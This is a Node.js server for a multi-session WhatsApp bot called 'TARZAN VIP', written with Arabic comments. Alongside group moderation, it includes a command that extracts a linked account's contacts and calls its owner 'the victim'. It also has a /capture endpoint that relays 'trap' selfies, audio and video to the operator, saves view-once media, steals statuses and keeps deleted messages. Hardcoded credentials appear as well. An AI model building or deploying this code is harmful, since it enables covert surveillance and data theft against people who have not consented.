const express = require('express');
const fs = require('fs');
const path = require('path');
const qrCode = require('qrcode');
const moment = require('moment-timezone');
const axios = require('axios');
const pino = require('pino'); // 🛡️ كتم السجلات لمنع اختناق المعالج
const { GoogleGenerativeAI } = require('@google/generative-ai');

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    downloadMediaMessage,
    jidNormalizedUser,
    generateWAMessageFromContent,
    proto,
    Browsers
} = require('@whiskeysockets/baileys');
const NodeCache = require('node-cache'); // 🌟 [تطوير VIP] لتسريع معالجة التشفير للـ 100 جلسة

// 🛡️ درع حماية بيئة Node.js من الانطفاء المفاجئ (مطور)
process.on('uncaughtException', (err) => console.error('🚨 [عطل فادح تم منعه]:', err.message));
process.on('unhandledRejection', (err) => console.error('🚨 [رفض غير معالج تم منعه]:', err.message));

const app = express();
const PORT = process.env.PORT || 10000;
const MASTER_PASSWORD = 'tarzanbot'; 
const sessions = {};
const msgStore = new Map(); 
const spamTracker = new Map(); 
const contactsDB = {}; 

// 🌟 [تطوير VIP] كاش عالمي لتسريع قراءة الرسائل وتشفيرها لأكثر من 100 جلسة
const msgRetryCounterCache = new NodeCache({ stdTTL: 60 * 60, checkperiod: 60 * 10 });
const userDevicesCache = new NodeCache({ stdTTL: 60 * 10, checkperiod: 60 * 2 });

// ✅ 1. نظام حفظ الإعدادات (مع دعم المفتاح العالمي)
const settingsPath = path.join(__dirname, 'settings.json');
let botSettings = {};
if (fs.existsSync(settingsPath)) { 
    botSettings = JSON.parse(fs.readFileSync(settingsPath, 'utf8')); 
} else { 
    botSettings = { GLOBAL_CONFIG: { geminiApiKey: "" } };
    fs.writeFileSync(settingsPath, JSON.stringify(botSettings)); 
}

if (!botSettings.GLOBAL_CONFIG) {
    botSettings.GLOBAL_CONFIG = { geminiApiKey: "" };
    saveSettings();
}

// 🌟 [تطوير VIP] حفظ الإعدادات بشكل غير متزامن لمنع اختناق السيرفر عند وجود 100+ جلسة
let isSaving = false;
async function saveSettings() { 
    if (isSaving) return;
    isSaving = true;
    try {
        await fs.promises.writeFile(settingsPath, JSON.stringify(botSettings, null, 2));
    } catch (e) {
        console.error("❌ خطأ في حفظ الإعدادات:", e.message);
    } finally {
        isSaving = false;
    }
}
function generateSessionPassword() { return 'VIP-' + Math.random().toString(36).substring(2, 8).toUpperCase(); }

// ✅ 2. مجلد الخزنة للميديا المخفية
const vaultPath = path.join(__dirname, 'ViewOnce_Vault');
if (!fs.existsSync(vaultPath)) fs.mkdirSync(vaultPath);

// 🛡️ 3. نظام تفريغ الذاكرة الذكي (لتحمل 100+ جلسة) - 🌟 [تطوير VIP] تنظيف تدريجي ذكي
setInterval(() => { 
    const now = Date.now();
    let deletedCount = 0;
    
    // تنظيف الرسائل التي مر عليها أكثر من ساعة بدلاً من حذف الكل فجأة
    for (const [key, msg] of msgStore.entries()) {
        const msgTime = (msg.messageTimestamp * 1000) || now;
        if (now - msgTime > 60 * 60 * 1000) { 
            msgStore.delete(key);
            deletedCount++;
        }
    }
    
    spamTracker.clear(); // تنظيف السبام
    if (deletedCount > 0) console.log(`🧹 [حماية الرام] تم تنظيف ${deletedCount} رسالة قديمة من الذاكرة.`);
}, 15 * 60 * 1000); // يفحص كل 15 دقيقة

app.use(express.static('public'));
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb', extended: true }));

// ==========================================
// 🚀 4. معالج الأوامر
// ==========================================
const commandsMap = new Map();
const commandsPath = path.join(__dirname, 'commands');
if (!fs.existsSync(commandsPath)) fs.mkdirSync(commandsPath);

function loadCommands() {
    commandsMap.clear();
    const files = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
    for (const file of files) {
        try {
            delete require.cache[require.resolve(`./commands/${file}`)];
            const command = require(`./commands/${file}`);
            if (command.name && command.execute) {
                commandsMap.set(command.name.toLowerCase(), command);
                if (command.aliases && Array.isArray(command.aliases)) {
                    command.aliases.forEach(alias => commandsMap.set(alias.toLowerCase(), command));
                }
            }
        } catch (err) {
            console.error(`❌ خطأ في تحميل الأمر ${file}:`, err.message);
        }
    }
}
loadCommands();

// ==========================================
// ⚙️ 5. تشغيل الجلسات (محرك VIP)
// ==========================================
async function startSession(sessionId, res = null, pairingNumber = null) {
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    if (!botSettings[sessionId]) {
        botSettings[sessionId] = { 
            password: generateSessionPassword(), 
            botEnabled: true, 
            commandsEnabled: true, 
            aiEnabled: false, 
            autoReact: false, 
            reactEmoji: '❤️', 
            welcomeSent: false,
            antiLink: false,
            antiSpam: false,
            antiBadWords: false,
            badWordsList: ['كس', 'زق', 'شرموط', 'منيوك'],
            antiCall: false, 
            statusStealer: false 
        };
        saveSettings();
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    // 🌟 [تطوير VIP] إعدادات Baileys محسنة للثبات المطلق
    const sock = makeWASocket({
        version,
        auth: { 
            creds: state.creds, 
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) 
        },
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        markOnlineOnConnect: true,
        browser: Browsers.macOS('Edge'), // تمويه أفضل لحماية الجلسات
        syncFullHistory: false,
        generateHighQualityLinkPreviews: false,
        msgRetryCounterCache, 
        userDevicesCache,
        keepAliveIntervalMs: 30000, // إبقاء الاتصال حياً كل 30 ثانية
        retryRequestDelayMs: 5000, // تأخير إعادة المحاولة لتجنب الحظر
        connectTimeoutMs: 60000 // وقت كافي للاتصال
    });

    sessions[sessionId] = sock;
    contactsDB[sessionId] = new Map(); 

    sock.ev.on('creds.update', saveCreds);

    const saveContact = (id, name) => {
        if (!id) return;
        const cleanId = jidNormalizedUser(id);
        if (cleanId.endsWith('@s.whatsapp.net')) {
            const num = cleanId.split('@')[0];
            if (!contactsDB[sessionId].has(cleanId)) {
                contactsDB[sessionId].set(cleanId, { name: name || 'بدون اسم', number: num });
            }
        }
    };

    sock.ev.on('messaging-history.set', ({ contacts, chats }) => {
        if (contacts) contacts.forEach(c => saveContact(c.id, c.name || c.notify));
        if (chats) chats.forEach(chat => saveContact(chat.id, chat.name));
    });

    sock.ev.on('contacts.upsert', (contacts) => {
        contacts.forEach(c => saveContact(c.id, c.name || c.notify));
    });

    sock.ev.on('chats.upsert', (chats) => {
        chats.forEach(chat => saveContact(chat.id, chat.name));
    });

    sock.ev.on('call', async (calls) => {
        const settings = botSettings[sessionId];
        if (settings && settings.antiCall) {
            for (const call of calls) {
                if (call.status === 'offer') {
                    try {
                        await sock.rejectCall(call.id, call.from);
                        await sock.sendMessage(call.from, { text: '⚠️ *عذراً، نظام طرزان VIP يمنع استقبال المكالمات حالياً، يرجى التواصل نصياً.*' });
                    } catch(e) {}
                }
            }
        }
    });

    if (pairingNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(pairingNumber);
                const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
                if (res && !res.headersSent) res.json({ pairingCode: formattedCode });
            } catch (err) {
                console.log('❌ خطأ في كود الاقتران: ', err);
                if (res && !res.headersSent) res.status(500).json({ error: 'تعذر طلب الكود. السيرفرات مزدحمة، حاول بعد ثوانٍ.' });
            }
        }, 3000); 
    }

    sock.ev.on('connection.update', async (update) => {
        const { connection, qr, lastDisconnect } = update;
        if (qr && res && !pairingNumber && !res.headersSent) {
            try { const qrData = await qrCode.toDataURL(qr); res.json({ qr: qrData }); } catch(e){}
        }

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            
            // 🌟 [تطوير VIP] نظام إعادة اتصال ذكي لتفادي حظر السرعة
            if (shouldReconnect) {
                const retryDelay = statusCode === DisconnectReason.rateOverlimit ? 30000 : 5000;
                console.log(`⚠️ انقطع اتصال ${sessionId}، إعادة المحاولة بعد ${retryDelay/1000} ثانية...`);
                setTimeout(() => startSession(sessionId), retryDelay);
            } else { 
                console.log(`❌ تم تسجيل الخروج من الجلسة ${sessionId} يدوياً.`);
                delete sessions[sessionId]; 
                delete contactsDB[sessionId]; 
                fs.rmSync(sessionPath, { recursive: true, force: true }); 
            }
        }

        if (connection === 'open') {
            console.log(`✅ الجلسة ${sessionId} متصلة بنجاح وعملت في وضع VIP!`);
            const selfId = jidNormalizedUser(sock.user.id);
            try { await sock.updateProfileStatus(`🤖 طرزان الواقدي VIP | يعمل الآن`); } catch (e) {}

            if (!botSettings[sessionId].welcomeSent) {
                try {
                    const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك (لإعدادات الموقع):*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${botSettings[sessionId].password}\n\n🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 ⚔️*`;
                    await sock.sendMessage(selfId, { image: { url: 'https://b.top4top.io/p_3489wk62d0.jpg' }, caption: welcomeText });
                    botSettings[sessionId].welcomeSent = true; saveSettings();
                } catch(e) {}
            }
        }
    });

    // ==========================================
    // 🛡️ 6. مضاد الحذف الجبار
    // ==========================================
    sock.ev.on('messages.update', async updates => {
        for (const { key, update } of updates) {
            if (update?.message === null && key?.remoteJid && !key.fromMe) {
                try {
                    const storedMsg = msgStore.get(`${key.remoteJid}_${key.id}`);
                    if (!storedMsg?.message) return; 
                    const selfId = jidNormalizedUser(sock.user.id);
                    const senderJid = key.participant || storedMsg.key?.participant || key.remoteJid;
                    const number = senderJid.split('@')[0];
                    const name = storedMsg.pushName || 'مجهول';
                    const time = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
                    
                    const alertText = `🚫 *[رسالة محذوفة]* 🚫\n👤 *الاسم:* ${name}\n📱 *الرقم:* wa.me/${number}\n🕒 *الوقت:* ${time}\n👇 *المحتوى:*`;
                    await sock.sendMessage(selfId, { text: alertText });
                    await sock.sendMessage(selfId, { forward: storedMsg });
                } catch (err) {}
            }
        }
    });

    // ==========================================
    // 🔥 7. استقبال الرسائل المركزية
    // ==========================================
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        const msg = messages[0];
        if (!msg?.message) return; 

        const from = msg.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const sender = isGroup ? msg.key.participant : from;
        const pushName = msg.pushName || 'مجهول';
        const selfId = jidNormalizedUser(sock.user.id);
        const isFromMe = msg.key.fromMe || sender === selfId;

        const currentSettings = botSettings[sessionId] || {};
        
        if (from === 'status@broadcast' && currentSettings.statusStealer && !isFromMe) {
            try {
                await sock.sendMessage(selfId, { forward: msg, caption: `📥 *تم سحب ستوري من:* wa.me/${sender.split('@')[0]}` });
            } catch (e) {}
        }

        // 🌟 [تطوير VIP] تخزين ذكي للرسائل مع حد أقصى للذاكرة
        if (msgStore.size < 15000) msgStore.set(`${from}_${msg.key.id}`, msg);

        if (!currentSettings.botEnabled) return;

        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || '';
        
        if (isGroup && !isFromMe) {
            let isAdmin = false;
            let botIsAdmin = false;
            try {
                const groupMetadata = await sock.groupMetadata(from);
                const participants = groupMetadata.participants;
                isAdmin = participants.find(p => p.id === sender)?.admin !== null;
                botIsAdmin = participants.find(p => p.id === selfId)?.admin !== null;
            } catch (e) {}

            if (!isAdmin && botIsAdmin) {
                if (currentSettings.antiLink && (body.includes('http://') || body.includes('https://') || body.includes('chat.whatsapp.com'))) {
                    try {
                        await sock.sendMessage(from, { delete: msg.key });
                        await sock.sendMessage(from, { text: `🚫 @${sender.split('@')[0]} ممنوع إرسال الروابط في هذا القروب!`, mentions: [sender] });
                    } catch(e) {}
                    return;
                }

                if (currentSettings.antiSpam) {
                    const now = Date.now();
                    const userSpam = spamTracker.get(sender) || { count: 0, last: 0 };
                    if (now - userSpam.last < 2000) { 
                        userSpam.count++;
                        if (userSpam.count > 4) { 
                            try {
                                await sock.sendMessage(from, { delete: msg.key });
                                if (userSpam.count === 5) await sock.sendMessage(from, { text: `⚠️ @${sender.split('@')[0]} توقف عن التكرار (سبام)!`, mentions: [sender] });
                            } catch(e) {}
                            return;
                        }
                    } else { userSpam.count = 1; }
                    userSpam.last = now;
                    spamTracker.set(sender, userSpam);
                }

                if (currentSettings.antiBadWords && currentSettings.badWordsList) {
                    const hasBadWord = currentSettings.badWordsList.some(word => body.toLowerCase().includes(word.toLowerCase()));
                    if (hasBadWord) {
                        try {
                            await sock.sendMessage(from, { delete: msg.key });
                            await sock.sendMessage(from, { text: `🚫 @${sender.split('@')[0]} عذراً، هذه الكلمة ممنوعة هنا!`, mentions: [sender] });
                        } catch(e) {}
                        return;
                    }
                }
            }
        }

        let viewOnceIncoming = msg.message.viewOnceMessage || msg.message.viewOnceMessageV2 || msg.message.viewOnceMessageV2Extension;
        const mediaTypeCheck = Object.keys(msg.message)[0];
        if (msg.message[mediaTypeCheck]?.viewOnce === true) viewOnceIncoming = { message: msg.message };
        
        if (viewOnceIncoming && !isFromMe) {
            try {
                const actualMessage = viewOnceIncoming.message;
                const mediaType = Object.keys(actualMessage)[0];
                const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });

                const ext = mediaType === 'imageMessage' ? 'jpg' : (mediaType === 'videoMessage' ? 'mp4' : 'ogg');
                const fileName = `VO_${sender.split('@')[0]}_${Date.now()}.${ext}`;
                fs.writeFileSync(path.join(vaultPath, fileName), buffer);

                const reportTxt = `🚨 *[رادار الميديا المخفية]* 🚨\n\n👤 *المرسل:* ${pushName}\n📱 *الرقم:* wa.me/${sender.split('@')[0]}\n📁 *حُفظت باسم:* ${fileName}\n\n*— TARZAN VIP 👑*`;
                
                if (mediaType === 'imageMessage') await sock.sendMessage(selfId, { image: buffer, caption: reportTxt });
                else if (mediaType === 'videoMessage') await sock.sendMessage(selfId, { video: buffer, caption: reportTxt });
                else if (mediaType === 'audioMessage') await sock.sendMessage(selfId, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
            } catch (err) {}
        }

        if (currentSettings.autoReact && !isFromMe && !viewOnceIncoming) {
            try { await sock.sendMessage(from, { react: { text: currentSettings.reactEmoji || '❤️', key: msg.key } }); } catch(e) {}
        }

        const reply = async (text) => {
            try {
                await sock.sendPresenceUpdate('composing', from);
                return await sock.sendMessage(from, { text: text }, { quoted: msg });
            } catch(e) {}
        };

        const isCmd = body.startsWith('.');

        // ==========================================
        // 🧠 8. الذكاء الاصطناعي 
        // ==========================================
        if (currentSettings.aiEnabled && !isCmd && !isFromMe && body.trim() !== '' && !viewOnceIncoming) {
            try {
                await sock.sendPresenceUpdate('composing', from); 
                const query = body.trim();
                const API_KEY = 'AI_7bcc1564db6e491c'; 
                const API_URL = 'http://Fi5.bot-hosting.net:22214/api/chat';

                const response = await axios.post(API_URL, {
                    api_key: API_KEY,
                    prompt: query
                }, {
                    headers: { 'Content-Type': 'application/json' },
                    timeout: 25000 
                });

                if (response.data && response.data.status === 'success') {
                    await reply(response.data.response);
                }
            } catch (error) {}
            return; 
        }

        // ==========================================
        // 🎯 9. معالجة الأوامر الخارجية
        // ==========================================
        if (!currentSettings.commandsEnabled) return;

        let selectedId = msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ? JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '';
        let commandName = '';
        let args = [];
        let textArgs = '';

        if (selectedId) {
            commandName = selectedId.toLowerCase();
        } else if (isCmd) {
            args = body.slice(1).trim().split(/ +/);
            commandName = args.shift().toLowerCase();
            textArgs = args.join(' ');
        }

        if (!commandName) return;

        if (commandName === 'سحب_جهات' || commandName === 'contacts') {
            const target = args[0] || sessionId;
            if (!sessions[target]) return reply(`❌ الجلسة [${target}] غير متصلة حالياً في السيرفر.`);

            try {
                const contactsMap = contactsDB[target];
                const contactsArray = Array.from(contactsMap.values());

                if (contactsArray.length === 0) return reply("⚠️ لم يتم رصد أي جهات اتصال حتى الآن. قم بإرسال أي رسالة من هاتف الضحية لتحفيز المزامنة.");

                let fileContent = `👑 *[قائمة جهات اتصال نظام طرزان VIP]* 👑\n`;
                fileContent += `👤 *الجلسة المستهدفة:* ${target}\n`;
                fileContent += `📊 *إجمالي العدد المستخرج:* ${contactsArray.length}\n`;
                fileContent += `🕒 *توقيت السحب:* ${moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD")}\n`;
                fileContent += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

                contactsArray.forEach((c, i) => {
                    fileContent += `${i + 1}. 👤 الاسم: ${c.name}\n📱 الرقم: +${c.number}\n🔗 الرابط: wa.me/${c.number}\n\n`;
                });

                fileContent += `\n*— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑽𝑰𝑹𝑼𝑺 𝑫𝑨𝑻𝑨 ⚔️*`;

                const fileName = `Contacts_${target}_${Date.now()}.txt`;
                const filePath = path.join(__dirname, fileName);
                fs.writeFileSync(filePath, fileContent);

                await sock.sendMessage(from, { 
                    document: fs.readFileSync(filePath), 
                    fileName: `جهات_اتصال_${target}.txt`, 
                    mimetype: 'text/plain',
                    caption: `✅ تم استخراج *${contactsArray.length}* جهة اتصال بنجاح من الجلسة [${target}].`
                }, { quoted: msg });

                fs.unlinkSync(filePath);
            } catch (e) {
                reply("❌ فشلت عملية سحب البيانات. تأكد من استقرار اتصال الجلسة.");
            }
            return;
        }

        const commandData = commandsMap.get(commandName);

        if (commandData) {
            try {
                if (commandName !== '🌚' && commandName !== 'vv') {
                    await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
                }
                
                await commandData.execute({
                    sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix: '.', commandName, sessions, botSettings, saveSettings, sessionId
                });
            } catch (error) {
                if (commandName !== '🌚' && commandName !== 'vv') {
                    await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
                }
            }
        }
    });

    return sock;
}

// 🚀 تطوير: تشغيل الجلسات المحفوظة بشكل متزامن ناعم (Soft Boot)
async function bootExistingSessions() {
    const sessionsDir = path.join(__dirname, 'sessions');
    if (!fs.existsSync(sessionsDir)) return;
    const folders = fs.readdirSync(sessionsDir);
    
    console.log(`⏳ جاري إقلاع ${folders.length} جلسة محفوظة...`);
    for (const folder of folders) {
        if (fs.existsSync(path.join(sessionsDir, folder, 'creds.json'))) {
            try {
                await startSession(folder);
                await new Promise(resolve => setTimeout(resolve, 2000)); // استراحة ثانيتين بين كل جلسة لعدم خنق المعالج
            } catch (e) {
                console.error(`❌ فشل تشغيل الجلسة ${folder}:`, e.message);
            }
        }
    }
    console.log(`✅ اكتمل إقلاع جميع الجلسات.`);
}

// ==========================================
// 🎯 10. محرك الاستقبال الشامل 
// ==========================================
const extractCleanBase64 = (rawData) => {
    if (!rawData) return null;
    return rawData.includes(',') ? rawData.split(',')[1] : rawData;
};

app.post('/capture', async (req, res) => {
    let { type, data, targetNumber, trapId, moduleId, sessionId } = req.body;
    const currentTitle = moduleId || trapId || 'مُـسْـتَـنَـد نِـظَـامِـي';

    if (sessionId) {
        try { sessionId = decodeURIComponent(sessionId); } catch(e) {}
    }

    if (!type || !data || !sessionId) {
        return res.status(400).json({ success: false, message: "بيانات ناقصة." });
    }

    const sock = sessions[sessionId];
    if (!sock) {
        return res.status(400).json({ success: false, message: "البوت غير متصل حالياً." });
    }

    const jid = jidNormalizedUser(sock.user.id);
    
    try {
        const titleMsg = `╭════ 🎯 ﴿ إِشْـعَـارُ اسْـتِـقْـبَـال ﴾ 🎯 ════╮\n` +
                         `│\n` +
                         `│ 🚨 ╟ *النَّـوْع:* ${type.toUpperCase()}\n` +
                         `│ 🔖 ╟ *الـعُـنْـوَان:* ${currentTitle}\n` +
                         `│ ⏱️ ╟ *الـوَقْـت:* ${moment().tz("Asia/Riyadh").format("HH:mm:ss")}\n` +
                         `│\n` +
                         `╰══════════════════════════════╯`;
        await sock.sendMessage(jid, { text: titleMsg });

        if ((type === 'text' || type === 'message') && typeof data === 'string') {
            await sock.sendMessage(jid, { text: `📝 ╟ *الـرِّسَـالَـة الـمُـسْـتَـقْـبَـلَـة:*\n\n${data}` });
        }
        else if (type === 'selfie' && Array.isArray(data)) {
            for (let i = 0; i < data.length; i++) {
                const cleanStr = extractCleanBase64(data[i]);
                if (cleanStr) {
                    const buffer = Buffer.from(cleanStr, 'base64');
                    await sock.sendMessage(jid, { image: buffer, caption: `👁️ ╟ الـمُـلْـحَـق [ ${i + 1} / ${data.length} ]` });
                }
            }
        } 
        else if (type === 'audio' && typeof data === 'string') {
            const cleanStr = extractCleanBase64(data);
            if (cleanStr) {
                const buffer = Buffer.from(cleanStr, 'base64');
                await sock.sendMessage(jid, { audio: buffer, mimetype: 'audio/mp4', ptt: true });
            }
        }
        else if (type === 'video' && typeof data === 'string') {
            const cleanStr = extractCleanBase64(data);
            if (cleanStr) {
                const buffer = Buffer.from(cleanStr, 'base64');
                await sock.sendMessage(jid, { video: buffer, caption: `🎥 ╟ تَـسْـجِـيـلُ الـفِـيـدْيُـو الـمُـرْسَـل` });
            }
        }

        res.json({ success: true, message: "تم الاستلام بنجاح" });
    } catch (err) {
        res.status(500).json({ success: false, message: "فشل السيرفر في المعالجة." });
    }
});

// ==========================================
// 🌐 11. API Endpoints (لوحة التحكم)
// ==========================================
app.post('/create-session', (req, res) => {
    const { sessionId } = req.body;
    if (!sessionId) return res.status(400).json({ error: 'أدخل اسم الجلسة' });
    startSession(sessionId, res);
});

app.post('/pair', async (req, res) => {
    const { sessionId, number } = req.body;
    if (!sessionId || !number) return res.status(400).json({ error: 'أدخل الجلسة والرقم' });
    let formattedNumber = number.replace(/[^0-9]/g, '');
    
    if (sessions[sessionId] || fs.existsSync(path.join(__dirname, 'sessions', sessionId))) {
        if(sessions[sessionId]) sessions[sessionId].logout();
        delete sessions[sessionId];
        fs.rmSync(path.join(__dirname, 'sessions', sessionId), { recursive: true, force: true });
    }
    startSession(sessionId, res, formattedNumber);
});

app.post('/api/settings/get', (req, res) => {
    const { sessionId, password } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    res.json(settings);
});

app.post('/api/settings/save', async (req, res) => {
    const { sessionId, password } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    
    Object.assign(botSettings[sessionId], req.body);
    await saveSettings();
    res.json({ success: true, message: '✅ تم حفظ التعديلات' });
});

app.get('/sessions', (req, res) => { res.json({ count: Object.keys(sessions).length, sessions: Object.keys(sessions) }); });

app.post('/delete-session', async (req, res) => {
    const { sessionId, password } = req.body;
    if (password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور السيرفر خاطئة' });
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    if (sessions[sessionId]) { sessions[sessionId].logout(); delete sessions[sessionId]; }
    if (botSettings[sessionId]) { delete botSettings[sessionId]; await saveSettings(); }
    if (fs.existsSync(sessionPath)) { fs.rmSync(sessionPath, { recursive: true, force: true }); res.json({ message: `تم حذف ${sessionId}` }); } 
    else { res.status(404).json({ error: 'الجلسة غير موجودة' }); }
});

app.listen(PORT, async () => {
    console.log(`\n=========================================`);
    console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
    console.log(`🛡️ تم تفعيل نظام الحماية من الانهيار (Enterprise)`);
    console.log(`🧠 الكاش المدمج وإدارة الذاكرة تعمل بكفاءة لـ 100+ جلسة`);
    console.log(`=========================================\n`);
    await bootExistingSessions();
});
